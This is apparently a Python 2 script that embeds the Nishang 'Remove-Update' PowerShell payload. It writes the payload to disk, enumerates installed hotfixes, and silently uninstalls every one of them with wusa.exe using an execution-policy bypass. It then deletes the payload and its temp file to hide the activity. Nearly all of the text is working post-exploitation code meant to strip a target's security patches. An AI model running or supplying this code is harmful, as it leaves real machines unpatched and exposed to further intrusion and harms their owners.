# -*- coding: utf-8 -*-
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
#必须加上上面四行,否则各种编码的错误爆出
import os
import re
remove_update_ps1_file='''function Remove-Update {
<#
.SYNOPSIS
Nishang Payload which silently removes updates for a target machine.

.DESCRIPTION
This payload removes updates from a target machine. This could be 
used to remove all updates, all security updates or a particular update.

.PARAMETER KBID
THE KBID of update you want to remove. All and Security are also validd.

.EXAMPLE
PS > Remove-Update All
This removes all updates from the target.

.EXAMPLE
PS > Remove-Update Security
This removes all security updates from the target.

.EXAMPLE
PS > Remove-Update KB2761226
This removes KB2761226 from the target.

.LINK
http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $KBID
        )

    $HotFixes = Get-HotFix

    foreach ($HotFix in $HotFixes)
    {

        if ($KBID -eq $HotFix.HotfixId)
        {
        
            $KBID = $HotFix.HotfixId.Replace("KB", "") 
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBID /quiet /norestart"
            Write-Host "Removing $KBID from the target."
            Invoke-Expression $RemovalCommand
            break
        }
    
        if ($KBID -match "All")
        {
            $KBNumber = $HotFix.HotfixId.Replace("KB", "")
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBNumber /quiet /norestart"
            Write-Host "Removing update $KBNumber from the target."
            Invoke-Expression $RemovalCommand
        
        }
    
        if ($KBID -match "Security")
        {
            if ($HotFix.Description -match "Security")
            {
        
                $KBSecurity = $HotFix.HotfixId.Replace("KB", "")
                $RemovalCommand = "wusa.exe /uninstall /kb:$KBSecurity /quiet /norestart"
                Write-Host "Removing Security Update $KBSecurity from the target."
                Invoke-Expression $RemovalCommand
            }
        }
    

        while (@(Get-Process wusa -ErrorAction SilentlyContinue).Count -ne 0)
        {
            Start-Sleep 3
            Write-Host "Waiting for update removal to finish ..."
        }
    }

}
'''
with open("Remove-Update.ps1","a+") as f:
	f.write(remove_update_ps1_file)
os.system("powershell hotfix > hotfix.txt")
kb_pattern=re.compile(r'KB\d{3,20}',re.I)
with open("hotfix.txt","r+") as f:
	content=f.read()
kbs=re.findall(kb_pattern,content)
for each in kbs:
    os.system('''Powershell.exe -exec bypass -Command "& {Import-Module '.\Remove-Update.ps1'; Remove-Update %s}"''' % each)
os.system("del hotfix.txt")
os.system("del Remove-Update.ps1")